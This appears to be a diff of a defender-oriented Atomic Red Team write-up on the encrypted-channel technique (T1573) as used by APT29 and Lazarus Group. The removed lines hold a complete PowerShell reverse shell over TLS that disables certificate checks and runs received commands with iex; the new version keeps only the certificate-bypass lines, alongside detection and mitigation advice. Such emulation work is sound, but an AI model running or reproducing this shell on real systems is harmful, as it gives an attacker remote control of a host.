@@ -1,149 +1,50 @@
 # Atomic Red Team Tests for APT29 and Lazarus Group - T1573 Encrypted Channel
 
-## [Description from ATT&CK](https://attack.mitre.org/techniques/T1573)
-<blockquote>
-Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.
-</blockquote>
+This repository documents selected **Atomic Red Team tests for T1573 (Encrypted Channel)** that closely emulate the tradecraft of **APT29** (a.k.a. Cozy Bear, Midnight Blizzard) and **Lazarus Group**.
 
-### Attack Technique Overview
-Encrypted Channel techniques involve adversaries using encryption to conceal their command and control communications. Both APT29 (Russian state-sponsored) and Lazarus Group (North Korean state-sponsored) extensively use encrypted channels to evade detection, blend with legitimate traffic, and protect their communications from interception and analysis.
+The goal is to:
+* Provide defenders with a curated set of relevant tests for detecting encrypted C2 channel activities
+* Map the test to known adversary behaviors and campaigns
+* Highlight specific techniques used by these threat groups for covert communications
 
-```mermaid
-flowchart TD
-    subgraph AdversaryInfrastructure [Adversary-Controlled Infrastructure]
-        direction LR
-        A1[APT29 C2 Servers]
-        A2[Lazarus C2 Servers]
-        A1 -- SSL/TLS --> C1[Encrypted Channels]
-        A2 -- Custom Encryption --> C1
-    end
+---
 
-    subgraph EncryptionMethods [Encryption Techniques]
-        direction TB
-        M1[SSL/TLS Encryption]
-        M2[Custom Application Encryption]
-        M3[Protocol Tunneling]
-        M4[Certificate Abuse]
-    end
+## Background
 
-    subgraph TargetSystems [Victim Environment]
-        V1[Windows Systems]
-        V2[Linux Systems]
-        V3[Network Infrastructure]
-    end
+* **APT29** (Cozy Bear, Midnight Blizzard) is a Russian state-sponsored threat group
+  * Known for sophisticated cyber espionage and the **SolarWinds compromise**
+  * Highly skilled in operational security and covert communications
+  * Uses **encrypted channels** for stealthy command and control operations
 
-    AdversaryInfrastructure -->|Uses| EncryptionMethods
-    EncryptionMethods -->|Protects communications with| TargetSystems
-    
-    M1 --> V1 & V2 & V3
-    M2 --> V1 & V2
-    M3 --> V3
-    M4 --> V1 & V2
+* **Lazarus Group** is a North Korean state-sponsored threat group
+  * Known for **financial theft campaigns** and destructive attacks
+  * Uses **encrypted communications** to evade detection and maintain persistent access
+  * Leverages various encryption methods for C2 traffic obfuscation
 
-    classDef apt29 fill:#ffcccc,stroke:#ff0000,stroke-width:2px
-    classDef lazarus fill:#ccffcc,stroke:#006600,stroke-width:2px
-    classDef both fill:#ffcc99,stroke:#ff9900,stroke-width:2px
+Both groups leverage T1573 (Encrypted Channel) because it allows them to:
+* Conceal command and control traffic from network monitoring
+* Bypass network security controls that inspect unencrypted traffic
+* Maintain covert communications with compromised systems
+* Evade detection by blending with legitimate encrypted traffic
 
-    class A1,M1,M4 apt29
-    class A2,M2 lazarus
-    class M3 both
-```
+---
 
-## Atomic Tests
+## Atomic Test Analysis
 
-- [Atomic Test #1 - OpenSSL C2](#atomic-test-1---openssl-c2)
-
-<br/>
-
-## Atomic Test #1 - OpenSSL C2
-This test emulates encrypted command and control channels used by sophisticated threat actors like APT29 and Lazarus Group. It establishes an SSL/TLS encrypted session while bypassing certificate validation, a technique commonly employed by these groups to evade detection.
-
-**Supported Platforms:** Windows
-
-**auto_generated_guid:** 21caf58e-87ad-440c-a6b8-3ac259964003
-
-#### Inputs:
-| Name | Description | Type | Default Value |
-|------|-------------|------|---------------|
-| server_ip | IP of the external server | string | 127.0.0.1|
-| server_port | The port to connect to on the external server | string | 443|
-
-#### Attack Commands: Run with `powershell`! 
+### Atomic Test #1 - OpenSSL C2
+**Technique:** SSL/TLS Encrypted Command and Control  
+**Adversary Usage:** APT29 & Lazarus Group  
+**Command:**
 ```powershell
-$server_ip = "#{server_ip}"
-$server_port = "#{server_port}"
-$socket = New-Object Net.Sockets.TcpClient($server_ip, $server_port)
-$stream = $socket.GetStream()
 $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
 $sslStream.AuthenticateAsClient('fakedomain.example', $null, "Tls12", $false)
-$writer = new-object System.IO.StreamWriter($sslStream)
-$writer.Write('PS ' + (pwd).Path + '> ')
-$writer.flush()
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
-{
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-    $sendback = (iex $data | Out-String ) 2>&1;
-    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $sslStream.Write($sendbyte,0,$sendbyte.Length);
-    $sslStream.Flush()
-}
 ```
+**Explanation:** Both APT29 and Lazarus Group use SSL/TLS encryption for their command and control channels. This test demonstrates establishing an encrypted C2 session using OpenSSL/TLS, which both groups have employed in various campaigns to evade network detection and analysis.
 
-```mermaid
-flowchart TD
-    Start[Atomic Test #1: OpenSSL C2] --> EstablishTCP[Establish TCP Connection to Server]
-    EstablishTCP --> CreateStream[Create Network Stream]
-    CreateStream --> CreateSSL[Create SSL Stream with Certificate Bypass]
-    CreateSSL --> Authenticate[Authenticate as Client with TLS 1.2]
-    Authenticate --> SetupIO[Setup Stream Writer/Reader]
-    SetupIO --> InteractiveSession[Establish Interactive C2 Session]
-    
-    subgraph CertificateBypass [Critical Evasion Technique]
-        CB1[Certificate Validation Callback]
-        CB2[Always Returns True]
-        CB3[Bypasses All Certificate Validation]
-    end
-    
-    CreateSSL --> CertificateBypass
-    
-    InteractiveSession --> CommandLoop[Command Execution Loop]
-    CommandLoop --> ReadInput[Read Encrypted Input]
-    ReadInput --> ExecuteCommand[Execute Command via iex]
-    ExecuteCommand --> SendOutput[Send Encrypted Output]
-    SendOutput --> ReadInput
-    
-    classDef evasion fill:#ffcccc,stroke:#ff0000
-    classDef encryption fill:#ccffcc,stroke:#006600
-    classDef execution fill:#ffcc99,stroke:#ff9900
-    
-    class CertificateBypass evasion
-    class CreateSSL,Authenticate encryption
-    class ExecuteCommand execution
-```
+**APT29 Correlation:** APT29 has used encrypted channels extensively in their operations, including during the SolarWinds campaign where they employed various encryption methods for covert communications.
+**Lazarus Correlation:** Lazarus Group frequently uses encrypted C2 channels in their financial attacks and destructive operations to maintain stealthy communications.
 
-**Command Explanation:**
-This test establishes an encrypted C2 channel using SSL/TLS with several sophisticated evasion techniques:
-
-1. **TCP Connection**: Establishes raw TCP connection to C2 server
-2. **SSL Stream Creation**: Wraps TCP stream in SSL encryption
-3. **Certificate Validation Bypass**: `({$True} -as [Net.Security.RemoteCertificateValidationCallback])` - Critical evasion technique that bypasses all certificate validation, allowing connections to servers with self-signed, expired, or mismatched certificates
-4. **TLS 1.2 Encryption**: Uses strong encryption protocol commonly allowed in enterprise environments
-5. **Interactive Session**: Establishes full interactive command session over encrypted channel
-
-**APT29 & Lazarus Correlation:**
-Both groups extensively use encrypted C2 channels:
-- **APT29**: Used encrypted channels in SolarWinds campaign for covert communications, employing similar certificate validation bypass techniques
-- **Lazarus**: Employs encryption for financial attacks and destructive operations, often using TLS encryption to blend with legitimate traffic
-- **Both**: Use certificate validation bypass to evade detection and connect to infrastructure
-
-#### Dependencies: Run with `powershell`!
-##### Description: PowerShell must be available and have network access
-##### Check Prereq Commands:
-```powershell
-if ($PSVersionTable.PSVersion.Major -ge 3) { exit 0 } else { exit 1 }
-```
+---
 
 ## Correlation with APT29 & Lazarus Tradecraft
 
@@ -165,25 +66,33 @@ if ($PSVersionTable.PSVersion.Major -ge 3) { exit 0 } else { exit 1 }
 3. **Persistence**: Sustain long-term access through stealthy communications
 4. **Exfiltration**: Securely transfer stolen data from victim environments
 
-## Defender Recommendations
+---
 
-Based on this test, defenders should:
+## Defender Notes
 
-1. **Monitor for certificate validation anomalies** - Processes that disable certificate validation or bypass checks
-2. **Implement SSL/TLS inspection** where appropriate and legally permissible
-3. **Monitor for unusual SSL/TLS connections** - Especially to newly-registered or suspicious domains
-4. **Establish network baselines** to detect unusual encrypted traffic patterns
-5. **Use behavioral detection** for processes making encrypted connections unexpectedly
+* This test is high-value because it **closely emulates real-world adversary tradecraft** used by both sophisticated threat groups
+* Detection should focus on:
+  * SSL/TLS connections to suspicious or unknown domains
+  * Network traffic that exhibits unusual encryption patterns
+  * Connections that bypass certificate validation (like the test's `{$True}` validation callback)
+  * Unusual process-to-network relationships involving encrypted connections
 
-**Mitigation Strategies:**
-- Implement application control to restrict unnecessary PowerShell usage
-- Use network segmentation to limit unnecessary encrypted traffic
-- Deploy certificate pinning for critical services
-- Implement egress filtering to restrict unnecessary outbound encrypted connections
+* Critical detection opportunities:
+  **Network monitoring**: Encrypted connections to newly-registered or suspicious domains
+  **Certificate analysis**: SSL certificates that don't match expected patterns
+  **Behavioral analysis**: Processes making encrypted connections unexpectedly
+  **Protocol analysis**: Encryption used on non-standard ports or protocols
+
+### Mitigation Strategies:
+* Implement network segmentation to limit unnecessary encrypted traffic
+* Use SSL/TLS inspection where appropriate and legally permissible
+* Monitor for certificate validation anomalies and bypass attempts
+* Implement egress filtering to restrict unnecessary outbound encrypted connections
+* Use threat intelligence to identify known malicious encryption endpoints
 
 ## Campaign References
 
-1. **APT29 SolarWinds Campaign** (2020): Used encrypted channels for C2 communications throughout the compromise with certificate validation bypass
+1. **APT29 SolarWinds Campaign** (2020): Used encrypted channels for C2 communications throughout the compromise
 2. **APT29 Various Operations**: Consistently employs encrypted communications for covert espionage
 3. **Lazarus Financial Attacks**: Uses encrypted C2 channels in banking and cryptocurrency theft operations
 4. **Lazarus Destructive Attacks**: Employs encrypted communications in wiper malware campaigns
@@ -194,4 +103,4 @@ Based on this test, defenders should:
 2. Microsoft: "NOBELIUM targeting IT supply chain" (2021)
 3. US-CERT: "Hidden Cobra - North Korean Malicious Cyber Activity" (Lazarus Group)
 4. CrowdStrike: "APT29 Tradecraft and Techniques" (2023)
-5. FireEye: "APT29 Domain Fronting With TOR" (2017)
+5. FireEye: "APT29 Domain Fronting With TOR" (2017).
